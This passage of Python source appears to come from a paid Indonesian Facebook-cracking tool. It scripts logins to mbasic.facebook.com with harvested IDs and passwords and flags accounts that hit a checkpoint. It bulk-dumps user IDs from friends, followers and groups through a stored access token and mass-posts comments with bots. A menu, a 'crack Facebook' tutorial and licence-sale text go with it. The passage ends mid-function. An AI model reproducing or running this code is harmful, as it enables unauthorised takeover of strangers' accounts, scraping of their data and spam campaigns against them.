	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	try:
		run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print(war+"Excess Problem")
	if "c_user" in ses.cookies:
		print(war+I+"This Account Doesn't Check Points")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		for opt in range(len(ngew)):
			print(" "*3, str(opt+1)+". "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("   "+m+" NOTE : "+q+oh)
	else:
		print("   "+m+" NOTE : "+q+"ID And Password Broken Or Failed")
def check_in(user, pasw):
        import requests,bs4,sys,os,subprocess,getpass,hashlib
        import random,time,re,json
        from mechanize import Browser
        from bs4 import BeautifulSoup as parser
        from requests.exceptions import ConnectionError
        from mechanize import Browser
        mb = ("https://mbasic.facebook.com")
        ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
        ses = requests.Session()
        # kntl bapackkau pecah
        ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
        data = {}
        ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
        fm = ged.find("form",{"method":"post"})
        list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
        for i in fm.find_all("input"):
                if i.get("name") in list:
                        data.update({i.get("name"):i.get("value")})
                else:
                        continue
        data.update({"email":user,"pass":pasw})
        run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
        if "c_user" in ses.cookies:
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
                xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
                print(war+"This Account Is Associated With The Application : %s"%(str(len(xe))))
                num = 0
                for _ in xe:
                        num += 1
                        print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
        elif "checkpoint" in ses.cookies:
                form = run.find("form")
                dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
                jzst = form.find("input",{"name":"jazoest"})["value"]
                nh   = form.find("input",{"name":"nh"})["value"]
                dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
                xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
                ngew = [yy.text for yy in xnxx.find_all("option")]
                kia = ("%s"%(str(len(ngew))))
                if kia == "0":
                        print("   "+m+" NOTE : "+I+"This Account Tap Yes ✓")
                else:pass
                print(war+"Available Facebook Options : "+I+str(len(ngew)))
                for opt in range(len(ngew)):
                        print(" "*3, str(opt+1)+". "+ngew[opt])
        elif "login_error" in str(run):
                oh = run.find("div",{"id":"login_error"}).find("div").text
                print("   "+m+" NOTE : "+q+oh)
        else:
                print("   "+m+" NOTE : "+q+"ID And Password Broken Or Failed")

"""
def oldid():
	ppxx=open("dump/akunold.json", "w")
	files = input("\n"+war+"File Name : "+i)
"""
def fake():
	cekfile("Hasil")
	global bf, bg
	files = input("\n"+war+"File Name   : "+i)
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found")
		time.sleep(2)
		exit()
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		try:
			kntl = kontol.split("|")
			idn = (f'{kntl[0]}')
			bodat = (f'{kntl[0]}')
			name = (f'{kntl[1]}')
		except: pass
		try:
			cpx = (q+"["+K+"CP"+q+"] "+K)
			okx = (q+"["+I+"OK"+q+"] "+I)
			gg = random.choice([cpx,cpx,okx,cpx])
		except: pass
		if gg == (okx):
			bf += 1
		else:
			bg += 1
		try:
			print(gg+idn+"|"+name)
		except:
			continue
	exit(war+'Done ..')

def oldid():
	cekfile("dump")
	files = input("\n"+war+"File Name   : "+i)
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found")
		time.sleep(2)
		exit()
	pmm = input(war+"Separator Type : "+i)
	if pmm in [""," "]:
		oldid()
	else:
		pass
	asw = input(war+"Save File"+C+" ("+I+"dump/??.json"+C+"): "+i)
	if asw in [""," "]:
		asw = ("Anjay")
	else:
		pass
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		try:
			kntl = kontol.split(pmm)
			idn = (f'{kntl[0]}')
			bodat = (f'{kntl[0]}')
			name = (f'{kntl[1]}')
		except: pass
		try:
			if len(bodat) < 10:
				print(war+bodat+M+"   Very Old")
				ppx=open("dump/"+asw+".json", "a+")
				ppx.write(bodat+pmm+name+"\n")
				ppx.close()
		except:pass
		try:
			oldd = bodat.split("00000")
		except: pass
		try:
			old = (f"100000{oldd[1]}")
			print(war+old+I+"   Already old ")
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write(old+pmm+name+"\n")
			ppx.close()
		except:
			continue
	exit(war+"Done..")

def newid():
	nwwww=[]
	nwww=[]
	nww=[]
	nw=[]
	ko=0
	cekfile("dump")
	files = input("\n"+war+"File Name   : "+i)
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found")
		time.sleep(2)
		exit()
	pmm = input(war+"Separator Type : "+i)
	if pmm in [""," "]:
		oldid()
	else:
		pass
	asw = input(war+"Save File"+C+" ("+I+"dump/??.json"+C+"): "+i)
	if asw in [""," "]:
		asw = ("Anjay")
	else:
		pass
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		try:
			kntl = kontol.split(pmm)
			idn = (f'{kntl[0]}')
			bodat = (f'{kntl[0]}')
			name = (f'{kntl[1]}')
		except: pass
#		try:
#			if len(bodat) < 10:
#				print(war+bodat+M+"   Very Old")
#				ppx=open("dump/"+asw+".json", "a+")
#				ppx.write(bodat+pmm+name+"\n")
#				ppx.close()
#		except:pass
		try:
			new_, new__ = bodat.split("10001")
			ttt = (war+"10001"+new__)
			print (ttt) #,time.sleep(0.05)
			nwwww.append(ttt)
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write("10001"+new__+pmm+name+"\n")
			ppx.close()
		except:pass
		try:
			new_, new__ = bodat.split("10002")
			ttt = (war+"10002"+new__)
			print (ttt) #,time.sleep(0.05)
			nwww.append(ttt)
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write("10002"+new__+pmm+name+"\n")
			ppx.close()
		except:pass
		try:
			new_, new__ = bodat.split("10003")
			ttt = (war+"10003"+new__)
			print (ttt) #,time.sleep(0.05)
			nww.append(ttt)
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write("10003"+new__+pmm+name+"\n")
			ppx.close()
		except:pass
		try:
			new_, new__ = bodat.split("10004")
			ttt = (war+"10004"+new__)
			print (ttt) #,time.sleep(0.05)
			nw.append(ttt)
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write("10004"+new__+pmm+name+"\n")
			ppx.close()
		except:pass
		try:
			new_, new__ = bodat.split("10005")
			ttt = (war+"10005"+new__)
			print (ttt) #,time.sleep(0.05)
			nw.append(ttt)
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write("10005"+new__+pmm+name+"\n")
			ppx.close()
		except:pass
		try:
			new_, new__ = bodat.split("10006")
			ttt = (war+"10006"+new__)
			print (ttt) #,time.sleep(0.05)
			nw.append(ttt)
			ppx=open("dump/"+asw+".json", "a+")
			ppx.write("10006"+new__+pmm+name+"\n")
			ppx.close()
		except:
			continue
#		print(("\r*2015 : %s *2016/2017 : %s *2019/2020 : %s  *2021 : %s"%(len(nwwww),len(nwww), len(nww), len(nw))), end='               ');sys.stdout.flush()
		

	exit(war+"Done..")
# Enc Vvip

# Tapilan Menu
def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
        logs()
    os.system("clear")
    if os.path.exists('.prem'):
        license()
        status_prem=(f"{i}Yes")
        tesz='\033[0;92m'
        pass
    else:
        status_prem=(f"{m}Not")
        tesz='\033[0;91m'
    if os.path.exists('.admin'):
        license2()
        status_admin=(f"{i}Yes")
        teszz='\033[0;92m'
        pass
    else:
        status_admin=(f"{m}Not")
        teszz='\033[0;91m'
    if os.path.exists('.free'):
        license3()
        status_free=(f"{i}Yes")
        teszzz='\033[0;92m'
        pass
    else:
        status_free=(f"{m}Not")
        teszzz='\033[0;91m'
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    country=requests.get("http://ip-api.com/json/").json()["country"]
    os.system("clear")
    banner()
    get_visitor()
    try:
        pntk = ("%s"%(str(txd)))
        ta, tr = pntk.split("']")
        tq, tt = ta.split("['")
    except:tt = ("NONE")
    print((k+"\n["+p+"++"+k+"]"+p+" Today's Date                          : "+C+waktu))
    print((k+"["+p+"++"+k+"]"+p+" Key/Premium Active Date               : "+C+tt[0:7]))
    print((k+"["+p+"++"+k+"]"+p+" Premium                               : "+tesz+status_prem+p))
    print((k+"["+p+"++"+k+"]"+p+" Premium/Free                          : "+tesz+status_free+p))
    print((k+"["+p+"++"+k+"]"+p+" Administration                        : "+teszz+status_admin+p))
    print((k+"["+p+"••"+k+"]"+u+"=================================================================="+c+"⟩⟩"))
    print((k+"["+p+"++"+k+"]"+p+" Your Name/Nama Kamu                   : "+nama[0:10]))
    print((k+"["+p+"++"+k+"]"+p+" Your ID/ID Kamu                       : "+id))
    print((k+"["+p+"++"+k+"]"+p+" Your IP/IP Kamu                       : "+ip))
    print((k+"["+p+"++"+k+"]"+p+" Country/Negara                        : "+country))
    print((k+"["+p+"++"+k+"]"+p+" Last Updated/Terahir Update           : "+i+upda+p))
    print((k+"["+p+"++"+k+"]"+p+" You Join Date/Anda Bergabung Tanggal  : "+i+durasi+p))
    print((k+"["+p+"••"+k+"]"+u+"=================================================================="+c+"⟩⟩"))
    print((k+"["+p+"01"+k+"]"+p+" Dump ID From Public/Friend "))
    print((k+"["+p+"02"+k+"]"+p+" Dump ID From Followers"))
    print((k+"["+p+"03"+k+"]"+p+" Dump ID From Masal "+C+"("+tesz+" PREMIUM"+U+"/"+teszzz+"FREE "+C+")"+K))
    print((k+"["+p+"04"+k+"]"+p+" Dump ID From Name Search "+C+"("+tesz+" PREMIUM"+U+"/"+teszzz+"FREE "+C+")"+K))
    print((k+"["+p+"05"+k+"]"+p+" Dump ID From Grup Facebook "+C+"("+tesz+" PREMIUM"+U+"/"+teszzz+"FREE "+C+")"+K))
    print((k+"["+p+"06"+k+"]"+p+" Dump ID From OLD "+C+"("+tesz+" PREMIUM"+U+"/"+teszzz+"FREE "+C+")"+K))
    print((k+"["+p+"07"+k+"]"+p+" Start Crack/Mulai Crack"))
    print((k+"["+p+"08"+k+"]"+p+" Get Target Information"))
    print((k+"["+p+"09"+k+"]"+p+" View Crack Results"))
    print((k+"["+p+"10"+k+"]"+p+" Settings User Agent"))
    print((k+"["+p+"11"+k+"]"+tesz+" Login User Premium"))
    print((k+"["+p+"12"+k+"]"+teszz+" Login User Administrasi"))
    print((k+"["+p+"13"+k+"]"+teszzz+" Login User Premiun/Free"))
    print((k+"["+p+"14"+k+"]"+p+" Vvip Menu "+K+"("+I+"Pay And Free"+K+")"))
    print((k+"["+p+"15"+k+"]"+p+" Tutorial Crack Facebook "))
    print((k+"["+p+"16"+k+"]"+p+" Upgrade User Trial "+k+"("+i+"Trial To Premium"+k+")"))
    print((k+"["+p+"00"+k+"]"+p+" Logout "+k+"("+m+"REMOVE TOKEN"+k+")"))
    return choose_menu(status_prem,status_free)

def choose_menu(status_prem,status_free):
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		public()
	elif r=="2" or r=="02":
		follow()
	elif r=="3" or r=="03":
		if status_prem == (f"{i}Yes") or status_free == (f"{i}Yes"):
			dump_masal()
			exit()
		else:
			jalan(war+"Sorry you are not a premium user!")
			time.sleep(1)
			menu()
	elif r=="4" or r=="04":
		if status_prem == (f"{i}Yes") or status_free == (f"{i}Yes"):
			dumpsc()
			exit()
		else:
			jalan(war+"Sorry you are not a premium user!")
			time.sleep(1)
			menu()
	elif r=="5" or r=="05":
		if status_prem == (f"{i}Yes") or status_free == (f"{i}Yes"):
			cek_kuki(open("cookies","r").read())
#			cek_kuki(basecookie())
			dump_grup(basecookie())
			exit()
		else:
			jalan(war+"Sorry you are not a premium user!")
			time.sleep(1)
			menu()
	elif r=="6" or r=="06":
		if status_prem == (f"{i}Yes") or status_free == (f"{i}Yes"):
			dumppro()
			exit()
		else:
			jalan(war+"Sorry you are not a premium user!")
			time.sleep(1)
			menu()
	elif r=="7" or r=="07":
		dirs = os.listdir("dump")
		for file in dirs:
			filex = ("dump/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			print(war+"The File Name You Dump : "+M+filex+C+" ⟨"+K+"IDZ"+C+"⟩ "+M+total)
		dumai = input("\n"+war+"File Name   : "+i)
		try:
			buka_baju = open(dumai,"r").readlines()
		except FileNotFoundError:
			print(war+"File Not Found")
			time.sleep(2)
			exit()
		pilihcrack(dumai)
	elif r=="8" or r=="08":
		get_info()
	elif r=="9" or r=="09":
		resss()
#		ress()
	elif r=="10" or r=="10":
		os.system("rm -rf ua_me.txt")
		menu_user_agent()
	elif r=="11":
		license()
	elif r=="12":
		license2()
	elif r=="13":
		license3()
	elif r=="14":
		menuvvip()
		exit()
	elif r=="15":
		tutorial()
	elif r=="16":
		chatme()
	elif r=="fake":
		fake()
	elif r=="key":
		buatkey()
		input(inp+"Press Enter !!")
	elif r=="0" or r=="00":
		jalan(war+"Thank You For Using My Script")
		os.system("rm -rf login.txt")
		exit()
	else:
		print(war+'Please Fill Correctly !!')
		time.sleep(0.75), menu()
def chatme():
	import random,string
	def random_char(kg):
		return ''.join(random.choice(string.ascii_letters) for x in range(kg))
	key_me = (random_char(40))
	print(war+"Beforle continuing, please select the active trial period ! ")
	print(f'''{war}Social Accounts And Whatsapp Numbers :

{I}Whatsapp {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
{U}Telegram {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
{B}Facebook {C}:{P} m.facebook.com/llovexnxx {C}({K}Risky{C})

{war}Author Uses 4 Payment Methods :

{B}DANA  {C}:{P} 083143565470
{U}OVO   {C}:{P} 083143565470
{I}GOPAY {C}:{P} 083143565470
{P}PULSA {C}:{P} 083143565470 {C}({K}AXIS{C})

{war}Key/License Price :

{K}--- {I}Key Premium
{P}1 Minggu {K}={U} Rp15.000
{P}2 Bulan  {K}={I} Rp40.000
{P}3 Bulan  {K}={I} Rp50.000

{K}--- {I}Key Admin
{P}1 Minggu {K}={U} Rp15.000
{P}2 Bulan  {K}={I} Rp45.000
{P}3 Bulan  {K}={B} Rp50.000''')

	print(k+"["+p+"01"+k+"]"+k+" Premium 1 Minggu")
	print(k+"["+p+"02"+k+"]"+k+" Premium 1 Bulan")
	print(k+"["+p+"03"+k+"]"+k+" Premium 2 Bulan + Bot Facebook "+k+"("+p+"follow"+k+")")
	print(k+"["+p+"04"+k+"]"+k+" Admin 1 Minggu")
	print(k+"["+p+"05"+k+"]"+k+" Admin 1 Bulan ")
	print(k+"["+p+"06"+k+"]"+k+" Admin 3 Bulan + Bot Facebook "+k+"("+p+"follow,like,share post"+k+")")
	print(k+"["+p+"07"+k+"]"+k+" Premium + Admin 2 Minggu\n")
	nama = input(inp+"Enter Your Name (Nickname) : "+I)
	usera = input(inp+'Please Select User Purchase Menu : '+I)
	if nama in [""," "]:
		jalan(war+"Please Fill Correctly !!")
		chatme()
	if usera in [""," "]:
		jalan(war+"Please Fill Correctly !!")
		chatme()
	elif usera in ["01","1"]:
		userx = ('Premium+Yang+1+Minggu')
		pass
	elif usera in ["02","2"]:
		userx = ('Premium+Yang+1+Bulan')
		pass
	elif usera in ["03","3"]:
		userx = ('Premium+Yang+2+Bulan+±+Bot+Follow')
		pass
	elif usera in ["04","4"]:
		userx = ('Admin+Yang+1+Minggu')
		pass
	elif usera in ["05","5"]:
		userx = ('Admin+Yang+1+Bulan')
		pass
	elif usera in ["6","06"]:
		userx = ('Admin+Yang+3+Bulan+±+Bot+Follow,Like,Share')
		pass
	elif usera in ["7","07"]:
		userx = ('Admin+±+Premium+2+Minggu')
		pass
	else:
		jalan(war+"Please Fill Correctly !!")
		chatme()
	jalan(war+" You Will Be Redirected To WhatsApp Author !!")
#	ba = ("xdg-open https://api.whatsapp.com/send/?phone=%2B6283143565470&text=Hallo+Nama+Saya+*"+nama+"*%0ASaya%20Mau%20Beli%20User%20*"+userx+"*%0A%0AKEY%20:%20*"+key_me+"*&app_absent=0")
	ba = "xdg-open https://api.whatsapp.com/send/?phone=%2B6283143565470&text=Hallo+Nama+Saya+*NAMASAYA*%0ASaya%20Mau%20Beli%20User%20*NAMAUSER*%0A%0AKEY%20:%20*KEYSAYA*&app_absent=0"
	print (ba)
	os.system(ba)
#	time.sleep(4)
	exit(jalan("Silahkan Tunggu Hingga Diproses"))

def tutorial():
	print(f"""
{C}[{K}•{C}]{U}-------------------------{C}⟩⟩ {I}TUTORIAL CRACK FACEBOOK {C}⟨⟨{U}-------------------------{C}[{K}•{C}]
{C}   1. {K}SIAPKAM IDZ FACEBOOK YANG ADA TEMANNYA ATAU FOLLOW {C}({K}CONTOH IDZ{I} : 100051986210360{C})
{C}   2. {K}PILIH MENU DUMP IDZ PUBLIC/FOLLOW/MASAL/DLL
{C}   3. {K}MASUKAN IDZ TADI {C}({K}CONTOH IDZ : {I}100051986210360{C})
{C}   4. {K}MASUKAN LIMIT ({C}LIMIT : {I}5000{C})
{C}   5. {K}TULISKAN NAMA FILE DUMP {C}({K}sayang,target,ayam{C}) {K}DAN JANGAN LUPA SALIN NAMA HASIL DUMP
{C}   6. {K}PILIH NOMOR 6 {C}({K}START CRACK{C}) 
{C}   7. {K}TULISKAN NAMA FILE HASIL DUMP (PASTEKAN/TEMPELKAN) HASIL DUMP
{C}   8. {K}PILIH METHODS LOGIN CRACK {C}({K}B-API V2/Mbacik V2/DLL{C})
{C}   9. {K}PILIH PASSWORD YANG MAU DIGUNAKAN
{C}   10. {K}TINGGAL TUNGGU HASIL CRACKNYA 
{C}   11. {K}JIKA HASIL CRACK TIDAK MUCUL HARAP HIDUP MATIKAN MODE PESAWAT !!
{C}[{K}•{C}]{U}-------------------------{C}⟩⟩ {I}TUTORIAL CRACK FACEBOOK {C}⟨⟨{U}-------------------------{C}[{K}•{C}]
   {K}If you don't understand, please contact me : {I}6283143565470 {C}({K}WHATSAPP{C})""")
	input(war+'Press Enter To Go Back')
	menu()

def buatkey():
	import random,string
	expi = input(inp+"Enter Expiry Date : "+I)
	if expi in [""," "]:
		print(war+"Don't be empty dear")
		buatkey()
	def random_char(kg):
		return ''.join(random.choice(string.ascii_letters) for x in range(kg))
	print (war+random_char(40)+C+"|"+I+expi)
	print (war+random_char(40)+C+"|"+I+expi)
	print (war+random_char(40)+C+"|"+I+expi)
# Enc Menu

# Menu Bot And Script
def menu_bot():
	print("\n"+k+"["+p+"1"+k+"]"+k+" Bot Komen Post Target")
	print(k+"["+p+"2"+k+"]"+k+" Bot Komen Post Grup Target")
	print(k+"["+p+"3"+k+"]"+k+" Check My Group Id")
	ajg = input("\n"+war+'Pilih Menu : '+I)
	if ajg in [""," "]:
		print(war+"Fill it Correctly"), time.sleep(1)
		menu_bot()
	elif ajg in ["1","01"]:
		bot_komen_post()
	elif ajg in ["2","02"]:
		grup_komen()
	elif ajg in ["3","03"]:
		grupsaya()
	else:
		print(war+"Fill it Correctly"), time.sleep(1)
		menu_bot()
def bot_komen_post():
	komen = []
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\033[1;91m[!] Token not found")
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	os.system("clear")
	logo()
	print (bulat+"Use Words *"+I+"@"+K+"* For New Lines")
	ide = input(war+'ID Target : '+I)
	km = input(war+'Comment : '+I)
	limit = input(war+"Limit : "+I)
	km=km.replace('@','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		print (bulat+I+42*"=")
		for s in a['feed']['data']:
			f = s['id']
			komen.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print (bulat+I+'Done '+K+'['+I+km[:20].replace('\n',' ')+'... '+K+']')
		print (bulat+I+42*"=")
		print ("\r"+bulat+"Done... "+str(len(komen)))
		input("\n"+bulat+"Back..")
		menu_bot()
	except KeyError:
		print(bulat+"ID Failed...")
		input("\n"+bulat+"Back...")
		menu_bot()

def grup_komen():
	komengrup = []
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(war+"Token not found")
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	os.system('reset')
	logo()
	print (bulat+"Use Words *"+I+"<>"+K+"* For New Lines")
	ide = input(war+'ID Target : '+I)
	km = input(war+'Comment : '+I)
	limit = input(war+"Limit : "+I)
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print(war+"Name Grup : "+I+asw['name'])
	except KeyError:
		print(bulat+"Group ID Not Found")
		input("\n"+bulat+"Back...")
		menu_bot()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		print (bulat+I+42*"=")
		for s in a['feed']['data']:
			pwww = s['id']
			pb, f = pwww.split('_')
			komengrup.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print (bulat+I+'Done '+K+'['+I+km[:30].replace('\n',' ')+'... '+K+']')
		print (bulat+I+42*"=")
		print ("\r"+bulat+"Done... "+str(len(komengrup)))
		input("\n"+bulat+"Back..")
		menu_bot()
	except KeyError:
		print(bulat+"Problem Not Found...")
		input("\n"+bulat+"Back...")
		menu_bot()
def grupsaya():
	listgrup = []
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(bulat+"Token not found")
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	try:
		os.mkdir('dump')
	except OSError:
		pass
	os.system('reset')
	logo()
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('dump/GrupCheck.txt','w')
			listgrup.append(id+nama)
			f.write(id + ' ' + nama + '\n')
			print(war+"Nama Grup : "+I+str(nama)+K+"   ID Grup : "+m3+str(id),q)
		f.close()
		print (bulat+I+42*"=")
		print(war+"Group Total : "+I+"%s"%(len(listgrup)))
		print(war+"List Save : "+I+"dump/GrupCheck.txt")
		input("\n"+bulat+"Back..")
		menu_bot()
	except (KeyboardInterrupt,EOFError):
		input("\n"+bulat+"Stop !!...")
		menu_bot()
	except KeyError:
		os.remove('dump/GrupCheck.txt')
		print(war+'Group not found')
		input("\n"+bulat+"Back..")
		menu_bot()
	except requests.exceptions.ConnectionError:
		print(war+"No Connection")
		exit()
	except IOError:
		print (war+"Error")
		input("\n"+bulat+"Back..")
		menu_bot()
# Enc Menu Bot

# Menu Dump
def dump_masal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		os.system("rm -rf login.txt")
		exit(war+"Token Failed !!")
	main = []
	print("\n"+C+'['+K+'01'+C+'] '+K+'Dump Public')
	print(C+'['+K+'02'+C+'] '+K+'Dump Follow')
	print(C+'['+K+'03'+C+'] '+K+'Dump Public + Follow')
	dump_apa = input("\n"+inp+"Select Menu Dump : "+I)
	if dump_apa in ["", " "]:
		jalan(war+'Don`t Empty !!')
		time.sleep(1)
		dump_masal()
	elif dump_apa in ["1", "01"]:
		main.append("public")
		main = ("public")
	elif dump_apa in ["2", "02"]:
		main.append("follow")
		main = ("follow")
	elif dump_apa in ["3", "03"]:
		main.append("all")
		main = ("all")
	else:
		jalan(war+'Please Fill Correctly ! ')
		time.sleep(1)
		dump_masal()
	try:
		tanya_total = int(input(war+"Number of Targets (5) : "+I))
		filex = input(war+"File Name : "+I)
		limit = input(war+"Limit : "+I)
		limtz = limit
		dum = open('dump/'+filex+'.json','w') 
	except:tanya_total=1
	print("\n"+war+"Fill in 'me' if you want from friends list")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Target ID %s : "%(t))
		if main in ["public"]:
			try:
				dump = open('dump/'+filex+'.json','a+') 
				for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				dump.close()
			except KeyError:
				print(war+"Sorry It Seems This Idz Is Not Published !!")
		elif main in ["follow"]:
			try:
				dump = open('dump/'+filex+'.json','a+') 
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limtz+"&access_token="+token).json()["data"]:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				dump.close()
			except KeyError:
				print(war+"Sorry It Seems This Idz Is Not Published !!")
		elif main in ["all"]:
			try:
				dump = open('dump/'+filex+'.json','a+') 
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limtz+"&access_token="+token).json()["data"]:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				dump.close()
			except KeyError:
				print(war+"Sorry It Seems This Idz Is Not Published !!")
			try:
				dump = open('dump/'+filex+'.json','a+') 
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				dump.close()
			except KeyError:
				print(war+"Sorry It Seems This Idz Is Not Published !!")
		pass
	print(war+"Total ID : %s"%(len(id)))
	jalan(war+"Dump Results Saved In : "+I+"dump/"+filex+".json")
	input(war+"Enter !!")
	menu()

def public():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	id = []
	try: 
		print ("\n"+war+"Fill In 'me' If You Want From Your Own Publics")
		idt = input(bulat+"ID Public : "+I)
		if idt in [""," "]:
			print(war+"Don't Empty!!")
			time.sleep(1)
			public()
		filex = input("\n"+bulat+"File Name : "+C)
		if filex in [""," "]:
			filex = ('Mr.Risky')
		else:
			pass
		limtz = input(bulat+"Limit Dump Idz : "+C)
		if limtz in [""," "]:
			limtz = ('5000')
		else:
			pass
		print(war+"Wait a moment Checking ID !!");time.sleep(0.05)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			op = json.loads(pok.text)
			print (bulat+"Name : "+sp["name"])
		except KeyError:
			jalan(war+"Sorry Idz Target Not Published !!")
			pass
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limtz+"&access_token="+token)
		try:
